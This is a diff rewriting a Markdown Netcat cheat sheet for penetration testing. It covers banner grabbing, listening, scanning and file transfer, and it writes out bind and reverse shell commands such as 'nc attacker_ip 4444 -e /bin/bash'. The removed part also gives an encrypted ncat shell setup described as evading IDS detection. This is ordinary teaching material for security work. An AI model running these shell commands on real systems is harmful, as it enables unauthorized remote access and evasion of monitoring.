@@ -1,62 +1,121 @@
-Netcat, known as the "Swiss Army knife of networking," is a versatile command-line tool for reading and writing over network connections. It can be used for port scanning, file transfer, and even as a backdoor. Netcat allows you to establish TCP or UDP connections as both a client and a server, providing flexibility for a variety of applications, such as debugging network services and testing connectivity. It supports multiple protocols, including TCP, UDP, and Unix domain sockets, and can handle both IPv4 and IPv6 connections. It offers options for controlling data flow, setting timeouts, and handling data packets, providing users with precise control over their network interactions.
+# Netcat
 
-## How to Interact with a server
-`nc host port`
+Netcat (nc) is a networking utility used to read and write data across network connections.
 
-Example: `nc -v www.host.com 21`
-Example: `nc -v www.host.com 80`
+It is often called the **Swiss Army knife of networking** because it can be used for many tasks such as:
 
-## Opening a port and connecting
-`nc command port`
+- banner grabbing
+- port listening
+- file transfer
+- reverse shells
+- debugging network services
 
-### Opening a port
-Example Windows: `nc.exe -vlp port`
+Netcat is commonly used during penetration testing for interacting with services and establishing shell connections.
 
-Example Linux: `nc -vlp port`
+---
 
-### Connecting to a port
-Example Windows: `nc.exe ip port`
+# Installation
 
-Example Linux: `nc -v ip port`
+Netcat is included in Kali Linux.
 
-## Port Scanning
-`nc -vnz host port`
+If not installed:
 
-Example: `nc -vnz 192.168.0.1 1-1024`
+```bash
+sudo apt install netcat
+```
 
-## Bind Shell x Reverse Shell
-### Bind Shell
-In the Bind Shell, the attacker connects directly to the target's port
+Verify installation: ```bash nc -h ```
 
+---
 
-Example Linux opening the shell: `nc -vnlp port -e /bin/bash`
+# Basic Connection
 
-Example Windows to connect: `nc.exe -vn host port`
+Connect to a remote service: ```bash nc target_ip port ```
 
+Example: ```bash nc 192.168.1.10 80 ```
 
-Example Windows opening the shell: `nc.exe -vnlp port -e cmd.exe`
+This can be used to manually interact with services.
 
-Example Linux  to connect: `nc -vn host port`
+---
 
-### Reverse Shell
-In the Reverse shell, the target connects and sends the shell to the attacker
+# Banner Grabbing
 
+Retrieve service banners: ```bash nc target_ip port ```
 
-Example Linux opening the port: `nc -vnlp port`
+Example: ```bash nc 192.168.1.10 21 ```
 
-Example  Windows sending the shell: `nc.exe -vn host port -e cmd.exe`
+Often reveals service information such as FTP or SSH versions.
 
+---
 
-Example Windows opening the port: `nc.exe -vnlp port`
+# Listening on a Port
 
-Example Linux sending the shell: `nc -vn host port -e /bin/bash`
+Netcat can listen for incoming connections.
 
-## Netcat x Ncat
-Netcat has the ability to encrypt the data being passed through the shell, which makes it difficult for an IPS or an IDS to detect any threats
+Example: ```bash nc -lvnp 4444 ```
 
+Parameters:
 
-How to create the SSL key: `openssl req -x509 -newkey rsa:2048 -keyout chave.pem -out cert.pem -days 10`
+- ```-l``` → listen mode
 
-How to make the communication: `ncat -vnlp <port> --ssl-key chave.pem --ssl-cert cert.pem`
+- ```-v``` → verbose
 
-How to connct: `ncat -vn <host> <port> --ssl`
+- ```-n``` → no DNS resolution
+
+- ```-p``` → port
+
+---
+
+# Reverse Shell
+
+A reverse shell connects from the target machine back to the attacker.
+
+Listener on attacker machine: ```bash nc -lvnp 4444 ```
+
+Reverse shell on target: ```bash nc attacker_ip 4444 -e /bin/bash ```
+
+---
+
+# File Transfer
+
+Send a file: ```bash nc -lvnp 4444 < file.txt ```
+
+Receive the file: ```bash nc attacker_ip 4444 > file.txt ```
+
+---
+
+# Port Scanning
+
+Netcat can perform simple port scans.
+
+Example: ```bash nc -zv target_ip 20-100 ```
+
+Parameters:
+
+- ```-z``` → scan without sending data
+
+- ```-v``` → verbose output
+
+---
+
+# Useful Variants
+
+Different systems may include different versions of Netcat.
+
+Examples:
+
+- netcat-traditional
+
+- netcat-openbsd
+
+- ncat (from Nmap)
+
+Some features may vary between versions.
+
+---
+
+Notes
+
+Netcat is extremely flexible and often used during penetration testing to establish shells or interact with services.
+
+Always use these techniques only in **authorized environments.**
